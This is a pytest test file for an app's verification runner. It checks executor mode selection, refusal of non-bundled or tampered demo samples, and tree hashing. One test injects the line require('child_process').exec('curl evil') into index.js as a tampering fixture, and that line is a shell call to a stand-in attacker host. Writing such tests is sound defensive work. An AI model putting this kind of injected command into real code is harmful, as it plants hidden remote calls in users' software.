import asyncio
import shutil

import pytest
from helpers import real

from app.config import ROOT, Settings
from app.verify import runner
from app.verify.modes import (
    LocalExecutor,
    MockExecutor,
    sample_matches,
    tree_hash,
)

SAMPLE = real(ROOT / "samples" / "vuln-demo")


@pytest.fixture
def project(tmp_path):
    dst = tmp_path / "job" / "src"
    shutil.copytree(SAMPLE, dst)
    return dst


def make(project, tmp_path, mode, source="demo", filename="vuln-demo.zip"):
    s = Settings(_env_file=None, data_dir=tmp_path / "data", samples_dir=ROOT / "samples",
                 verify_mode=mode)
    job = {"source": source, "filename": filename}
    proposal = {"pid": "p_000000000000", "changes": [], "status": "approved"}
    return runner.Verification("j", "p_000000000000", job, tmp_path, project, proposal, [], s,
                               lambda e: None)


def pick(v):
    return asyncio.run(runner.pick_executor(v))


def test_off_is_unable(project, tmp_path):
    executor, mode, reason = pick(make(project, tmp_path, "off"))
    assert executor is None and mode == "off" and "turned off" in reason


def test_mock(project, tmp_path):
    assert isinstance(pick(make(project, tmp_path, "mock"))[0], MockExecutor)


def test_auto_falls_back_to_demo_local_for_bundled_sample(project, tmp_path):
    executor, mode, _ = pick(make(project, tmp_path, "auto"))
    assert isinstance(executor, LocalExecutor) and mode == "demo-local"


@pytest.mark.parametrize("source,filename", [("upload", "vuln-demo.zip"),
                                             ("demo", "other.zip"), ("upload", "app.zip")])
def test_demo_local_refuses_non_samples(project, tmp_path, source, filename):
    executor, _, reason = pick(make(project, tmp_path, "demo-local", source, filename))
    assert executor is None and "bundled demo" in reason


def test_demo_local_refuses_tampered_sample(project, tmp_path):
    (project / "index.js").write_text("require('child_process').exec('curl evil')")
    executor, _, _ = pick(make(project, tmp_path, "auto"))
    assert executor is None
    assert not sample_matches(project, ROOT / "samples", "vuln-demo.zip")


def test_tree_hash_ignores_node_modules_and_line_endings(project):
    before = tree_hash(project)
    (project / "node_modules" / "x").mkdir(parents=True)
    (project / "node_modules" / "x" / "i.js").write_text("1")
    pkg = project / "package.json"
    pkg.write_bytes(pkg.read_bytes().replace(b"\n", b"\r\n"))
    assert tree_hash(project) == before
